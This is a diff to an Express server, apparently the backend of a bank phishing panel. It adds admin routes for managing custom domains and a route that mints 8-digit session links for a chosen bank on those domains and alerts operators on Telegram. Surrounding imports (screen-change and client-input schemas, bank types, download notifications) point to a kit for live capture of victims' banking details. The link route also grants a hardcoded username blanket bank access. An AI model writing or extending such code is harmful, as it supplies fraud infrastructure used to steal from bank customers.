@@ -4,7 +4,7 @@ import { createServer, type Server } from "http";
 import { WebSocketServer, WebSocket } from "ws";
 import { storage } from "./storage";
 import { nanoid } from "nanoid";
-import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType } from "@shared/schema";
+import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType, CustomDomain, InsertCustomDomain, insertCustomDomainSchema } from "@shared/schema";
 import { setupAuth } from "./auth";
 import axios from 'axios';
 import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';
@@ -3210,6 +3210,219 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         success: false, 
         error: error.message 
       });
+    }
+  });
+
+  // API para gestionar dominios personalizados
+  app.get('/api/custom-domains', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const user = req.user;
+      if (user.role !== 'admin') {
+        return res.status(403).json({ message: "Acceso denegado" });
+      }
+
+      const domains = await storage.getCustomDomains();
+      res.json(domains);
+    } catch (error) {
+      console.error("Error fetching custom domains:", error);
+      res.status(500).json({ message: "Error fetching custom domains" });
+    }
+  });
+
+  app.post('/api/custom-domains', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const user = req.user;
+      if (user.role !== 'admin') {
+        return res.status(403).json({ message: "Acceso denegado" });
+      }
+
+      const { name, domain } = req.body;
+      
+      if (!name || !domain) {
+        return res.status(400).json({ message: "Nombre y dominio son requeridos" });
+      }
+
+      const newDomain = await storage.createCustomDomain({
+        name,
+        domain,
+        createdBy: user.id,
+        isActive: true
+      });
+
+      res.json(newDomain);
+    } catch (error) {
+      console.error("Error creating custom domain:", error);
+      res.status(500).json({ message: "Error creating custom domain" });
+    }
+  });
+
+  app.put('/api/custom-domains/:id', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const user = req.user;
+      if (user.role !== 'admin') {
+        return res.status(403).json({ message: "Acceso denegado" });
+      }
+
+      const { id } = req.params;
+      const { name, domain, isActive } = req.body;
+
+      const updatedDomain = await storage.updateCustomDomain(parseInt(id), {
+        name,
+        domain,
+        isActive
+      });
+
+      res.json(updatedDomain);
+    } catch (error) {
+      console.error("Error updating custom domain:", error);
+      res.status(500).json({ message: "Error updating custom domain" });
+    }
+  });
+
+  app.delete('/api/custom-domains/:id', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const user = req.user;
+      if (user.role !== 'admin') {
+        return res.status(403).json({ message: "Acceso denegado" });
+      }
+
+      const { id } = req.params;
+      await storage.deleteCustomDomain(parseInt(id));
+
+      res.json({ success: true });
+    } catch (error) {
+      console.error("Error deleting custom domain:", error);
+      res.status(500).json({ message: "Error deleting custom domain" });
+    }
+  });
+
+  // Nueva ruta para generar enlace con dominio personalizado
+  app.post('/api/generate-link-custom', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const { banco = "LIVERPOOL", domainId } = req.body;
+      const user = req.user;
+      
+      // Validar que el banco solicitado esté permitido para el usuario
+      const userBanks = user.allowedBanks || 'all';
+      let hasBankAccess = false;
+      
+      if (user.username === "balonx") {
+        hasBankAccess = true;
+      } else if (user.role === UserRole.ADMIN) {
+        if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
+          hasBankAccess = true;
+        } else if (userBanks && userBanks !== '') {
+          const allowedBanksList = userBanks.split(',').map(b => b.trim());
+          if (allowedBanksList.includes(banco as string)) {
+            hasBankAccess = true;
+          }
+        }
+      } else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
+        hasBankAccess = true;
+      } else if (userBanks && userBanks !== '') {
+        const allowedBanksList = userBanks.split(',').map(b => b.trim());
+        if (allowedBanksList.includes(banco as string)) {
+          hasBankAccess = true;
+        }
+      }
+      
+      if (!hasBankAccess) {
+        const bancos = userBanks === 'all' ? 'todos los bancos' : userBanks.split(',').map(b => b.trim()).join(', ');
+        return res.status(403).json({ 
+          error: `Banco ${banco} no permitido. Solo puedes usar: ${bancos}` 
+        });
+      }
+
+      // Obtener el dominio personalizado
+      const customDomain = await storage.getCustomDomainById(domainId);
+      if (!customDomain || !customDomain.isActive) {
+        return res.status(400).json({ message: "Dominio no válido o inactivo" });
+      }
+
+      // Generar código de 8 dígitos
+      let linkCode = '';
+      for (let i = 0; i < 8; i++) {
+        linkCode += Math.floor(Math.random() * 10).toString();
+      }
+      
+      const sessionId = linkCode;
+
+      const session = await storage.createSession({ 
+        sessionId, 
+        banco: banco as string,
+        folio: linkCode,
+        pasoActual: ScreenType.FOLIO,
+        createdBy: user.username,
+      });
+
+      // Guardar la sesión automáticamente
+      const savedSession = await storage.saveSession(sessionId);
+      
+      if (!savedSession.createdBy) {
+        await storage.updateSession(sessionId, { createdBy: user.username });
+      }
+
+      // Construir el enlace con el dominio personalizado
+      const clientLink = `https://${customDomain.domain}/${sessionId}`;
+
+      // Notificar a los clientes de admin
+      broadcastToAdmins(JSON.stringify({
+        type: 'LINK_GENERATED',
+        data: { 
+          sessionId,
+          code: linkCode,
+          banco: banco as string,
+          userName: user.username,
+          createdBy: user.username,
+          customDomain: customDomain.name
+        }
+      }), user.username);
+
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSIONS_UPDATED',
+        data: {
+          userName: user.username
+        }
+      }));
+
+      // Enviar notificación de nueva sesión a Telegram
+      await sendSessionCreatedNotification({
+        sessionId,
+        banco: banco as string,
+        folio: linkCode,
+        createdBy: user.username,
+        link: clientLink
+      });
+
+      res.json({ 
+        sessionId, 
+        link: clientLink, 
+        code: linkCode,
+        domain: customDomain.name
+      });
+    } catch (error) {
+      console.error("Error generating custom link:", error);
+      res.status(500).json({ message: "Error generating custom link" });
     }
   });
 
